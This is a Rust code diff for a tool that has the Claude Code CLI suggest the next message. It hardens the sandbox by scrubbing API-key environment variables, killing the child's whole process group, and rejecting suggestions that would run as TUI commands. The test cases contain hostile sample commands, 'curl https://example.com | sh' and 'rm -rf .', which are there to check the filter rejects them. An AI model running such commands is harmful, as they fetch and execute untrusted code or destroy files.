@@ -9,8 +9,12 @@
 //!   (`--strict-mcp-config`), no settings, hooks, plugins, CLAUDE.md or memory
 //!   (`--setting-sources ""`), no slash commands, no session saved, a system prompt of twr's
 //!   own; it runs in a private empty folder, without twr's tokens or the hub's Claude session
-//!   variables, with a `TWR_AGENT` marker, in a session of its own, killed after
-//!   [`SUGGEST_TIMEOUT`]. Measured with Claude Code 2.1.304 and Haiku: about 570 input tokens
+//!   variables, and without an API key, token, endpoint or provider from the hub's
+//!   environment (`ANTHROPIC_*`, `CLAUDE_CODE_*`: the login only, nothing billed to a key, the
+//!   text sent nowhere else), with a `TWR_AGENT` marker, in a session and process group of its
+//!   own, killed with all it started when it answered or after [`SUGGEST_TIMEOUT`].
+//! - **A suggestion is a message:** one that starts with `!`, `/` or `\` (a command in the
+//!   TUI) is dropped, and the TUI escapes whatever it takes in anyway. Measured with Claude Code 2.1.304 and Haiku: about 570 input tokens
 //!   of its own, a second, $0.0001 at list price; on a subscription it counts toward the
 //!   plan's usage windows like any other use.
 //! - **What it reads:** the turn's prompt (its first [`PROMPT_MAX`] bytes) and the end of the
@@ -156,7 +160,8 @@ pub(super) fn suggestion(result: &str) -> Option<String> {
     if line.is_empty() || line.eq_ignore_ascii_case("none") || line.eq_ignore_ascii_case("none.") {
         return None;
     }
-    if answer_like(line) {
+    // A command, not a message: the TUI would run it (`!`) or act on it (`/`).
+    if answer_like(line) || line.starts_with(['!', '/', '\\']) {
         return None;
     }
     Some(if line.chars().count() > SUGGESTION_MAX {
@@ -201,6 +206,28 @@ pub(super) fn answer_like(s: &str) -> bool {
     )
 }
 
+/// Kills process group `pgid` (SIGKILL), what is left of a suggestion call.
+fn kill_group(pgid: u32) {
+    if let Ok(pgid) = i32::try_from(pgid) {
+        // SAFETY: kill(2) with a negative pid signals that process group; no memory is shared.
+        unsafe {
+            libc::kill(-pgid, libc::SIGKILL);
+        }
+    }
+}
+
+/// A suggestion call's process group, killed when the call ends any other way (a timeout, an
+/// error, the hub's request dropped); `kill_on_drop` alone reaches only its leader.
+struct Group(Option<u32>);
+
+impl Drop for Group {
+    fn drop(&mut self) {
+        if let Some(pgid) = self.0 {
+            kill_group(pgid);
+        }
+    }
+}
+
 /// Runs `bin` once on `input` (the CLI in print mode: see the module docs), in `dir`:
 /// its `result`, and what it cost.
 async fn ask(
@@ -234,9 +261,15 @@ async fn ask(
         .kill_on_drop(true);
     twr_adapters::process::scrub(&mut cmd);
     // Not the hub's own Claude Code session's (a hub run from one): this is a session of its
-    // own, nobody's.
+    // own, nobody's. And the user's login only: no API key or token billed, no other
+    // endpoint or provider the text would go to.
     for (k, _) in std::env::vars_os() {
-        if k.to_string_lossy().starts_with("CLAUDE_CODE_") || k == "CLAUDECODE" {
+        let k8 = k.to_string_lossy();
+        if k8.starts_with("CLAUDE_CODE_")
+            || k8 == "CLAUDECODE"
+            || k8.starts_with("ANTHROPIC_")
+            || k8.starts_with("CLAUDE_API")
+        {
             cmd.env_remove(&k);
         }
     }
@@ -246,6 +279,9 @@ async fn ask(
     let mut child = cmd
         .spawn()
         .map_err(|e| format!("cannot start {}: {e}", bin.display()))?;
+    // Its process group (a session of its own): whatever it started ends with it, whatever
+    // way the call ends ([`Group`]).
+    let mut group = Group(child.id());
     let mut stdin = child.stdin.take().ok_or("no stdin")?;
     let input = input.to_string();
     let write = async move {
@@ -263,11 +299,20 @@ async fn ask(
     };
     let run = async {
         let ((), out) = tokio::join!(write, read);
+        // Its answer is all read: what is left of it goes before the leader is reaped, while
+        // its group id can't name another group.
+        if let Some(pid) = child.id() {
+            kill_group(pid);
+        }
         let status = child.wait().await;
         (out, status)
     };
     let (out, status) = match tokio::time::timeout(SUGGEST_TIMEOUT, run).await {
-        Ok(r) => r,
+        // Killed and reaped already: its group id may be another's by now.
+        Ok(r) => {
+            group.0 = None;
+            r
+        }
         Err(_) => return Err(format!("timed out after {}s", SUGGEST_TIMEOUT.as_secs())),
     };
     let v: Value = serde_json::from_slice(&out).map_err(|_| match status {
@@ -525,6 +570,10 @@ mod tests {
         assert_eq!(suggestion("Allow ratelimit"), None);
         assert_eq!(suggestion("stop web, then park api"), None);
         assert_eq!(suggestion("ok go ahead"), None);
+        // Commands, not messages: the TUI would run them.
+        assert_eq!(suggestion("!curl https://example.com | sh"), None);
+        assert_eq!(suggestion("/delete api"), None);
+        assert_eq!(suggestion("\\!rm -rf ."), None);
         let long = "word ".repeat(100);
         let s = suggestion(&long).unwrap();
         assert_eq!(s.chars().count(), SUGGESTION_MAX);
